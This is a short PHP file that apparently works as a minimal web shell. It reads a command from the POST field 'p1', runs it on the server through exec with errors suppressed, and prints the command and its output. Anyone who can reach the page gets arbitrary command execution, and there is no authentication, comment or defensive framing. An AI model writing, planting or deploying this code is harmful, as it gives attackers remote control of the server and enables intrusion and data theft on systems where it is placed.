<?php
function ex($in) {
	$out = '';
	@exec($in,$out);
	$out = @join("\n",$out);
	return $out;
}

if(!empty($_POST['p1']))
	echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1']));
?>